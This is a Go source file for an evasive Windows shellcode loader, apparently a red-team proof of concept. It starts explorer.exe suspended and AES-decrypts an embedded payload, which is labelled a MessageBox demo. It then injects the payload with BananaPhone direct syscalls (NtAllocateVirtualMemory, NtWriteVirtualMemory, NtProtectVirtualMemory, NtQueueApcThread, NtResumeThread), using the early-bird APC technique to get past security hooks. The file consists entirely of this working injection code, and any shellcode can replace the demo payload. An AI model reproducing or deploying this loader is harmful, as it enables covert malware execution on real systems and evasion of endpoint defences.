package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

var (
	// MessageBox x64 payload
	shellcode = []byte{0xd6, 0x65, 0x38, 0x59, 0x5f, 0x62, 0xa5, 0x27, 0x4e, 0xf6, 0x1c, 0x7e, 0xb8, 0x44, 0x1c, 0x63, 0x99, 0xca, 0xbc, 0x68, 0x86, 0xb4, 0x9b, 0x25, 0xc1, 0xaf, 0x10, 0xbf, 0x92, 0xd6, 0xb0, 0x8c, 0xce, 0xff, 0x4f, 0x8b, 0x22, 0x19, 0x1b, 0x80, 0x3f, 0x6a, 0x64, 0xaf, 0xa6, 0x4c, 0x38, 0x1a, 0x97, 0x50, 0x6c, 0xbd, 0x0, 0x1, 0x36, 0x7d, 0x48, 0x15, 0x57, 0xc9, 0xe6, 0x2b, 0x2e, 0xb2, 0x67, 0xd4, 0x73, 0xe2, 0xf1, 0x3a, 0xd2, 0x44, 0xe1, 0x58, 0xbd, 0x9d, 0x62, 0x58, 0x84, 0x66, 0xfa, 0x35, 0xd9, 0xce, 0x9b, 0x95, 0xdd, 0x97, 0xf4, 0x48, 0xf3, 0x53, 0xcc, 0xc2, 0xc1, 0x3e, 0x30, 0x61, 0xe, 0xd9, 0xbf, 0x6d, 0x60, 0x96, 0x23, 0xc8, 0xfa, 0xd6, 0xb3, 0x43, 0x5e, 0x86, 0xcb, 0xf8, 0xa8, 0x38, 0x20, 0x30, 0xeb, 0x67, 0xd1, 0x88, 0x6a, 0xd8, 0x41, 0x3c, 0xe5, 0xf6, 0x25, 0x62, 0xfa, 0x3a, 0x79, 0xdb, 0x49, 0xf, 0xa1, 0x84, 0x28, 0x4f, 0xf7, 0xc4, 0xb7, 0xaf, 0xf2, 0xae, 0xbe, 0xfe, 0x92, 0x3d, 0x4a, 0x6a, 0x48, 0x17, 0x72, 0x72, 0xa9, 0xc0, 0x66, 0x2, 0x7, 0x60, 0xe0, 0xf9, 0xfa, 0x18, 0xe9, 0x5f, 0xae, 0x62, 0xb1, 0xa1, 0x10, 0x2e, 0x8d, 0x4d, 0xc6, 0xfb, 0x87, 0x6f, 0x54, 0xae, 0xec, 0x82, 0x3f, 0xc8, 0x71, 0x12, 0xac, 0xea, 0xcd, 0x38, 0xd5, 0x47, 0x2b, 0xa0, 0xc2, 0xb, 0xa3, 0x49, 0x92, 0xc9, 0xed, 0x8, 0x8a, 0x26, 0x79, 0x6, 0xdb, 0x99, 0x17, 0x83, 0x56, 0x62, 0x44, 0xa1, 0x3e, 0x32, 0xed, 0xf, 0x54, 0x89, 0xce, 0xf9, 0x7d, 0x95, 0xb0, 0x39, 0xdd, 0x5, 0x3e, 0x49, 0x35, 0x6e, 0x56, 0xd4, 0xfd, 0x9f, 0x5e, 0xe9, 0x44, 0x5f, 0x70, 0x5d, 0x8, 0x83, 0xfe, 0x5e, 0x7b, 0x16, 0x77, 0x4b, 0xed, 0xc0, 0x5e, 0x99, 0xa1, 0x35, 0x7d, 0x8b, 0x7b, 0x99, 0xde, 0x9, 0xae, 0x89, 0xff, 0x34, 0x20, 0xe0, 0x28, 0xd, 0xcf, 0x96, 0x73, 0x7, 0xa8, 0x2c, 0x62, 0x6e, 0x54, 0x8, 0xe4, 0x52, 0x9b, 0x24, 0xff, 0x6a, 0xdb, 0xd1, 0x3e, 0xcb, 0xcc, 0x8e, 0xb0, 0xaf, 0xa7, 0xef, 0x3c, 0xe6, 0xf0, 0xaf, 0x35, 0xdb}
	key       = []byte{0xbd, 0x68, 0xfd, 0xf7, 0x25, 0x9b, 0xf1, 0xe1, 0xf4, 0x36, 0x6, 0xc5, 0xfd, 0x96, 0x1a, 0x2e}
)

func Aes256Decode(cipherText []byte, encKey []byte) (decrypted []byte) {
	aKey := sha256.Sum256(encKey)
	bKey := aKey[:]
	bIV := []byte{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}

	block, err := aes.NewCipher(bKey)
	if err != nil {
		panic(err)
	}

	// CryptBlocks can work in-place if the two arguments are the same.
	mode := cipher.NewCBCDecrypter(block, bIV)
	mode.CryptBlocks(cipherText, cipherText)
	return cipherText
}

func main() {
	// Create babanaphone to ntdll and kernel32
	nt_bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		fmt.Println("[-] Error creating banana ntdll", err.Error())
	}

	// Kernel32 LoadLibrary
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		log.Fatalln(err)
	}
	defer syscall.FreeLibrary(kernel32)

	//Create Process in suspended state
	CreateProcessInternalW, err := syscall.GetProcAddress(syscall.Handle(kernel32), "CreateProcessInternalW")
	if err != nil {
		log.Fatalln(err)
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	path, _ := syscall.UTF16PtrFromString(`C:\Windows\explorer.exe`)

	r, _, err := syscall.SyscallN(uintptr(CreateProcessInternalW),
		0,                                 // IN HANDLE hUserToken,
		uintptr(unsafe.Pointer(path)),     // IN LPCWSTR lpApplicationName,
		0,                                 // IN LPWSTR lpCommandLine,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
		0,                                 // IN BOOL bInheritHandles,
		uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,
		0,                                 // IN LPVOID lpEnvironment,
		0,                                 // IN LPCWSTR lpCurrentDirectory,
		uintptr(unsafe.Pointer(&si)),      // IN LPSTARTUPINFOW lpStartupInfo,
		uintptr(unsafe.Pointer(&pi)),      // IN LPPROCESS_INFORMATION lpProcessInformation,
		0)                                 // OUT PHANDLE hNewToken)
	if r > 1 {
		log.Printf("CreateProcessInternalW ERROR CODE: %x", r)
	}

	fmt.Println("[+] Explorer started in suspended mode, press enter to continue")
	reader := bufio.NewReader(os.Stdin)
	reader.ReadString('\n')

	// Decode shellcode
	decPayload := Aes256Decode(shellcode, key)

	// Allocate virtual memory
	var mem_alloc uintptr
	reg_size := uintptr(len(decPayload))

	NTAllocateVirtualMemory, err := nt_bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		log.Fatalln(err)
	}
	bananaphone.Syscall(NTAllocateVirtualMemory,
		uintptr(pi.Process),                 // IN HANDLE ProcessHandle,
		uintptr(unsafe.Pointer(&mem_alloc)), // IN OUT PVOID *BaseAddress,
		0,                                   // IN ULONG_PTR ZeroBits,
		uintptr(unsafe.Pointer(&reg_size)),  // IN OUT PSIZE_T RegionSize,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), // IN ULONG AllocationType,
		windows.PAGE_READWRITE,                          // IN ULONG Protect
	)

	// Write to new allocated memory
	NTWriteVirtualMemory, e := nt_bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		fmt.Println("[-] Error getting sysID for NTWriteVirtualMemory ", e.Error())
	}

	e1, e := bananaphone.Syscall(NTWriteVirtualMemory,
		uintptr(pi.Process),                     // IN HANDLE ProcessHandle,
		mem_alloc,                               // IN PVOID BaseAddress,
		uintptr(unsafe.Pointer(&decPayload[0])), // IN PVOID Buffer,
		reg_size,                                // IN ULONG NumberOfBytesToWrite,
		uintptr(unsafe.Pointer(nil)),            // OUT PULONG NumberOfBytesWritten OPTIONAL
	)
	if e != nil {
		fmt.Println("[-] Error calling NtWriteVirtualMemory ", e1, e)
	}

	fmt.Printf("[+] Decrypted payload written to: 0x%x\n", mem_alloc)
	fmt.Println("[?] Press enter to continue")
	reader.ReadString('\n')

	// Change memory permissions
	var oldprotect uintptr
	NTProtectVirtualMemory, e := nt_bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		fmt.Println("[-] Error getting sysID for NTProtectVirtualMemory ", e.Error())
	}
	e1, e = bananaphone.Syscall(NTProtectVirtualMemory,
		uintptr(pi.Process),                  // IN HANDLE ProcessHandle,
		uintptr(unsafe.Pointer(&mem_alloc)),  // IN OUT PVOID *BaseAddress,
		uintptr(unsafe.Pointer(&reg_size)),   // IN OUT PULONG NumberOfBytesToProtect,
		windows.PAGE_EXECUTE_READ,            // IN ULONG NewAccessProtection,
		uintptr(unsafe.Pointer(&oldprotect)), // OUT PULONG OldAccessProtection
	)
	if e != nil {
		fmt.Println("[-] Error calling NtProtectVirtualMemory ", e1, e)
	}

	// Queue Asynchronous Process Call
	NtQueueApcThread, err := nt_bp.GetSysID("NtQueueApcThread")
	if err != nil {
		fmt.Println("[-] Error getting sysID for NtQueueApcThread ", e.Error())
	}
	a, _ := bananaphone.Syscall(NtQueueApcThread,
		uintptr(pi.Thread), // IN HANDLE ThreadHandle,
		mem_alloc,          // IN PIO_APC_ROUTINE ApcRoutine, (RemoteSectionBaseAddr)
		0,                  // IN PVOID ApcRoutineContext OPTIONAL,
		0,                  // IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
		0,                  // IN ULONG ApcReserved OPTIONAL
	)
	if a != 0 {
		log.Printf("[-] NtQueueApcThread ERROR CODE: %x", a)
	}

	fmt.Println("[+] Payload queued")

	// Resume Thread
	NtResumeThread, err := nt_bp.GetSysID("NtResumeThread")
	if err != nil {
		fmt.Println("[-] Error getting sysID for NtResumeThread ", e.Error())
	}
	a, _ = bananaphone.Syscall(NtResumeThread,
		uintptr(pi.Thread), // IN HANDLE ThreadHandle,
		0,                  // OUT PULONG SuspendCount OPTIONAL
		0,
	)
	if a != 0 {
		log.Printf("[-] NtResumeThread ERROR CODE: %x", a)
	}
}
